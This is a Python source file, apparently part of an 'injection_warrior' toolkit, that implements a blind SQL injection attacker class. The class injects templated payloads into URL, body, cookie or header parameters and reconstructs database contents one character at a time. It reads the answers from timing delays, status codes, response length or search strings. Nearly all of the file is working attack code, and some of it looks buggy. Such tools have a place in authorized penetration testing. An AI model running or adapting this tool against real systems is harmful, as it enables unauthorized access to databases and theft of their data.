from injection_warrior import warrior

# Author h0rac

import hashlib
import requests
import sys
import itertools
from bs4 import BeautifulSoup
import aiohttp
import sys
import asyncio
import time
import hashlib
import requests
import zipfile
from bs4 import BeautifulSoup
from termcolor import colored
import re


class SQLiBlind(warrior.Injector):
    def __init__(self, proxy=None, debug=False, allow_redirects=True):
        super().__init__(proxy, debug, allow_redirects)
        """SQLiBlind constructor

        Args:
            proxy ([type], optional): [description]. Defaults to None.
            debug (bool, optional): [description]. Defaults to False.
        """
        self.proxy = proxy
        self.debug = debug
        
    # START Base methods

    def _url_path_parse(self, url="", payloads=[]):
        return super(SQLiBlind, self)._url_path_parse(url=url, payloads=payloads)

    def _run(self, http_method="get", urls=[], html=False, injection_point="url", body_params={}, req_json=False, resp_json=False, cookie_params={}, url_params={}, header_params={}, resp_body=True):
        return super(SQLiBlind, self)._run(http_method, urls, html, injection_point, body_params, req_json,resp_json, cookie_params, url_params, header_params, resp_body)

    def _params_converted(self, payloads=[], params={}):
        return super(SQLiBlind, self)._params_converted(payloads=payloads, params=params)

    def inject_payload(self, url="", payloads={}, blind_type="", 
                       content_length=None, status_code=0, 
                       search_string="", http_method="get", injection_point="url",  
                       body_params={}, req_json=False, resp_json=False, html=False, 
                       cookie_params={}, url_params={}, header_params={}, resp_body=True, **kwargs):
        """method allows to inject payloads to HTTP request/s
           When payloads are used, header|body|cookie|url dictionary should have value as %$%
           example: url_params = {"productId": %$%}

        Args:
            url (str): [URL for endpoint]. Defaults to "".
            payloads (list, optional): [list of payloads for which requests will be generated]. Defaults to [].
            http_method (str, optional): [HTTP method (GET/POST/PUT/PATCH/DELETE/OPTIONS/HEAD)]. Defaults to "get".
            injection_point (str, optional): [Place where payloads should be injected]. Defaults to "url".
            body_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            req_json (bool, optional): [Flag define if request should be send as JSON formatted data]. Defaults to False.
            resp_json (bool, optional): [Flag define if response should be displayed as JSON formatted data]. Defaults to False.
            html (bool, optional): [Flag define if response should be displayed as HTML]. Defaults to False.
            cookie_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            url_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            header_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
            resp_body (bool, optional): [Flag define if response body should be printed on output console]. Defaults to True.
            kwargs(dict, optional) [quote: "'", delimiter: '+', comment: '--', comma: ",", oracle: False, nulls: 1, table_name:  "", column_name_1: "", column_name_2: "", sleep: 5]

        Returns:
            [dict]: Dictionary as key value pair
        """
        
        sleep = kwargs.get('sleep') if kwargs.get('sleep') != None else 5
        iterations = kwargs.get('iterations') if kwargs.get('iterations') != None else 1
        comma = kwargs.get('comma') if kwargs.get('comma') != None else ","

        if self.debug:
            print(colored(
                '''[+] BLIND attack 'inject_payload' selected parameters: 
            ITERATIONS: {}
            BLIND TYPE ATTACK: {}
            EXPECTED STATUS CODE: {}
            EXPECTED CONTENT LENGTH: {}
            EXPECTED SEARCH STRING: {}
            TIME BASED SLEEP: {}
            URL: {}
            HTTP METHOD: {}
            ORIGINAL PAYLOAD: {}
            INJECTION POINT: {}
            BODY PARAMS: {}
            REQ JSON: {}
            RESP JSON: {}
            RETURN HTML: {}
            COOKIE PARAMS: {}
            URL PARAMS: {}
            BODY PARAMS: {}
            HEADER PARAMS: {}
            RESP_BODY:{}
            KWARGS: {}
             '''.format(iterations, blind_type, status_code, content_length, search_string, sleep, url, http_method, payloads, injection_point, 
                        body_params, req_json, resp_json, html, cookie_params, url_params, body_params, header_params,
                resp_body, kwargs), "yellow"))

        values = []
        cookie_params_list = []

        urls = self._url_path_parse(url, payloads)
        if not len(urls) > 0:
            urls = [url]

        if search_string != "" and not html:
            print(colored(
                "[-] Not supported combination for search_string:'{}' and html: '{}' ".format(search_string, html), "red"))
            sys.exit(0)

        if iterations > 0 and blind_type == "time_based":
            # TODO FINISH OTHER INJECTION POINTS
            responses = []
            if injection_point == "cookie":
                cookie_params_list = self.__get_prepared_params(params=cookie_params, payloads=payloads, **kwargs)
                for cookie_params in cookie_params_list:
                    responses.append(super(SQLiBlind, self).inject_payload(url=url, payloads=payloads, http_method=http_method, injection_point=injection_point,  body_params=body_params, req_json=req_json, resp_json=resp_json, html=html, cookie_params=cookie_params,
                                                                           url_params=url_params, header_params=header_params, resp_body=resp_body))
            elif injection_point == "url":
                url_params_list = self.__get_prepared_params(params=url_params, payloads=payloads, **kwargs)
                for url_params in url_params_list:
                    responses.append(super(SQLiBlind, self).inject_payload(url=url, payloads=payloads, http_method=http_method, injection_point=injection_point,  body_params=body_params, req_json=req_json, resp_json=resp_json, html=html, cookie_params=cookie_params,
                                                                           url_params=url_params, header_params=header_params, resp_body=resp_body))
            elif injection_point == "body":
                body_params_list = self.__get_prepared_params(params=body_params, payloads=payloads, **kwargs)
                for body_params in body_params_list:
                    responses.append(super(SQLiBlind, self).inject_payload(url=url, payloads=payloads, http_method=http_method, injection_point=injection_point,  body_params=body_params, req_json=req_json, resp_json=resp_json, html=html, cookie_params=cookie_params,
                                                                           url_params=url_params, header_params=header_params, resp_body=resp_body))
            elif injection_point == "header":
                header_params_list = self.__get_prepared_params(params=header_params, payloads=payloads, **kwargs)
                for header_params in header_params_list:
                    responses.append(super(SQLiBlind, self).inject_payload(url=url, payloads=payloads, http_method=http_method, injection_point=injection_point,  body_params=body_params, req_json=req_json, resp_json=resp_json, html=html, cookie_params=cookie_params,
                                                                           url_params=url_params, header_params=header_params, resp_body=resp_body))

            return self.__get_time_based_results(responses=responses, sleep=kwargs.get('sleep'), injection_point=injection_point, status_code=status_code, content_length=content_length, search_string=search_string, comma=kwargs.get('comma'))

        if iterations > 0 and blind_type != "time_based":
            responses = []
            if injection_point == "cookie":
                cookie_params_list = self.__get_prepared_params(params=cookie_params, payloads=payloads, **kwargs)
                responses = self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point,
                                     cookie_params=cookie_params_list, url_params=url_params, body_params=body_params, header_params=header_params, req_json=req_json, resp_json=resp_json, resp_body=resp_body)
            elif injection_point == "url":
                url_params_list = self.__get_prepared_params(params=url_params, payloads=payloads, **kwargs)
                responses = self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point,
                                    cookie_params=cookie_params, url_params=url_params_list, body_params=body_params, header_params=header_params, req_json=req_json, resp_json=resp_json, resp_body=resp_body)

            elif injection_point == "body":
                body_params_list = self.__get_prepared_params(params=body_params, payloads=payloads, **kwargs)
                responses = self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point,
                                    cookie_params=cookie_params, url_params=url_params, body_params=body_params_list, header_params=header_params, req_json=req_json, resp_json=resp_json, resp_body=resp_body)

            elif injection_point == "header":
                header_params_list = self.__get_prepared_params(params=header_params, payloads=payloads, **kwargs)
                responses = self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point,
                                    cookie_params=cookie_params, url_params=url_params, body_params=body_params, header_params=header_params_list, req_json=req_json, resp_json=resp_json, resp_body=resp_body)

            return self.__process_responses(responses=responses, search_string=search_string,
                                        status_code=status_code, content_length=content_length, url=url, injection_point=injection_point, comma=comma, sleep=sleep)

        return super(SQLiBlind, self).inject_payload(url=url, payloads=payloads, http_method=http_method, injection_point=injection_point,  body_params=body_params, req_json=req_json, resp_json=resp_json, html=html, cookie_params=cookie_params, url_params=url_params, header_params=header_params, resp_body=resp_body)

    def __process_responses(self, responses=[], search_string="", status_code=0, content_length=1, url="", injection_point="", comma="'", sleep=0):
        client_resp = None
        soup_html = None
        responses_results = []
        try:
            ascii_value = ""
            for r in responses:
                client_resp = r.get('raw_response')
                header_param = r.get('header_params')
                json_resp = r.get('json_resp')
                soup_html = r.get('soup')
                cookie_param = r.get('cookie')
                url_param = r.get('url_param')
                header_param = r.get('header_param')
                body_param = r.get('body_param')
                elapsed = r.get('elapsed')

                if injection_point == "cookie":
                    responses_results.append(self.__extract_data(param=cookie_param, search_string=search_string, status_code=status_code,
                                                                 content_length=content_length, soup_html=soup_html, comma=comma, client_resp=client_resp))
                elif injection_point == "header":
                    responses_results.append(self.__extract_data(param=header_param, search_string=search_string, status_code=status_code,
                                                                 content_length=content_length, soup_html=soup_html, comma=comma, client_resp=client_resp))
                elif injection_point == "url":
                    responses_results.append(self.__extract_data(param=url_param, search_string=search_string, status_code=status_code,
                                                                 content_length=content_length, soup_html=soup_html, comma=comma, client_resp=client_resp))
                elif injection_point == "body":
                    responses_results.append(self.__extract_data(param=body_param, search_string=search_string, status_code=status_code,
                                                                 content_length=content_length, soup_html=soup_html, comma=comma, client_resp=client_resp))
        except TypeError as e:
            print(colored("[-] Error __process_responses: {}".format(e), "red"))
            sys.exit(0)

        return self.__display_responses(responses=responses_results, search_string=search_string, status_code=status_code,
                                        content_length=content_length, soup_html=soup_html, comma=comma, client_resp=client_resp, sleep=sleep)

    def __display_responses(self, responses=[], search_string="", status_code=404,
                            content_length=-1, soup_html="", comma="", client_resp="", sleep=0):
        flatten_responses = [
            item for sublist in responses for item in sublist]
        filtered_results = []
        for r in flatten_responses:
            for k, v in r.items():
                if k == "elapsed":
                    v = int(v)
                    if v == int(sleep):
                        filtered_results.append(r)
                elif v == search_string and len(search_string) > 0:
                    filtered_results.append(r)
                elif k == "expect_status_code" and client_resp != None and type(client_resp) != str:
                    if v == client_resp.status:
                        filtered_results.append(r)
                elif k == "resp_content_length":
                    if content_length != None and int(v) > content_length and content_length > 0:
                        filtered_results.append(r)
                    # print("data: {}, iter: {}".format(r.get('ascii'), r.get('iter')))

        print(filtered_results)
        data =[]
        for item in sorted(filtered_results, key=lambda i: i['iter']):
            for k, v in item.items():
                if k == "iter":
                    # print(item.get('ascii'), end='')
                    temp = item.get('ascii')
                    data.append(temp)
        return ''.join(data)

    def __extract_data(self, param=None, search_string="", status_code=0, content_length=-1, soup_html=None, comma=',', client_resp=None, elapsed=None):
        params = param.keys()
        responses_results = []
        ascii_value = ""
        resp_text = ""
        for key in params:
            m = re.search(r'(%2c|,)\d+(%2c|,){1}', param.get(key))
            iteration = m.group(0).split(comma)[1]
            m = re.search(r'(\)=)\d{1,3}', param.get(key))
            ascii_value = m.group(0).split('=')[1]
            if len(search_string) > 0:
                resp_text = soup_html.find(text=re.compile(search_string))
            responses_results.append({'search_string': resp_text, 'resp_status_code': client_resp.status if client_resp != None else "", 'ascii': chr(
                int(ascii_value)), "iter": int(iteration), "resp_content_length":client_resp.headers['Content-Length'], "content_length": content_length, "expect_status_code": status_code, "elapsed": elapsed if elapsed != None else 1})
        # print(responses_results)
        return responses_results

    def __divide_conquer(self):
        reminders = []
        ascii_table = [x for x in range(32, 126)]
        for item in ascii_table:
            char = 128
            high_half = 0
            reminder = 128
            temp = char
            while char > 1:
                if reminder not in reminders:
                    reminders.append(reminder)
                if item < char:
                    high_half = char - temp
                    char = int(temp / 2)
                    reminder = char + high_half
                    temp = char
                else:
                    char = int(temp/2)
                    reminder = reminder + char
                    char = reminder
        return reminders

    def __get_prepared_params(self, params={}, payloads=[], **kwargs):
        values = []
        # TODO Fix usage of divide_conquer 
        # questions = self.__divide_conquer()
        questions = [x for x in range(32, 126)]
        # print("QUESTIONS", questions)
        for q in questions:
            for i in range(1, kwargs.get('iterations')+1):
                kwargs['iterations'] = i
                kwargs['char'] = q
                temp = self._parse_template(payloads=payloads, **kwargs)
                values.append(temp)
        flatten_values = [
            item for sublist in values for item in sublist]
        params_list = self._params_converted(
            payloads=flatten_values, params=params)
        return params_list

    def __get_time_based_results(self, responses=[], sleep=0, injection_point="url",  status_code="", content_length="", search_string="", comma=","):
        flatten_resp = [item for sublist in responses for item in sublist]
        responses_results = []
        soup_html=None,
        response = None
        for r in flatten_resp:
            response = r.get('raw_response')
            header_param = r.get('header_params')
            json_resp = r.get('json_resp')
            soup_html = r.get('soup')
            cookie_param = r.get('cookie')
            url_param = r.get('url_param')
            header_param = r.get('header_param')
            body_param = r.get('body_param')
            elapsed = r.get('elapsed')
            
            if injection_point == "cookie":
                responses_results.append(
                    (elapsed, cookie_param, response, soup_html, content_length, status_code, search_string))
            elif injection_point == "body":
                responses_results.append(
                    (elapsed, body_param, response, soup_html, content_length, status_code, search_string))
            elif injection_point == "header":
                responses_results.append(
                    (elapsed, header_param, response, soup_html, content_length, status_code, search_string))
            elif injection_point == "url":
                responses_results.append(
                    (elapsed, url_param, response, soup_html, content_length, status_code, search_string))

        n_responses = []
        for item in responses_results:
            n_responses.append(self.__extract_data(elapsed=item[0], param=item[1], client_resp=response,
                                                   soup_html=soup_html, comma=comma, content_length=content_length, status_code=status_code, search_string=search_string))
        return self.__display_responses(responses=n_responses, sleep=sleep)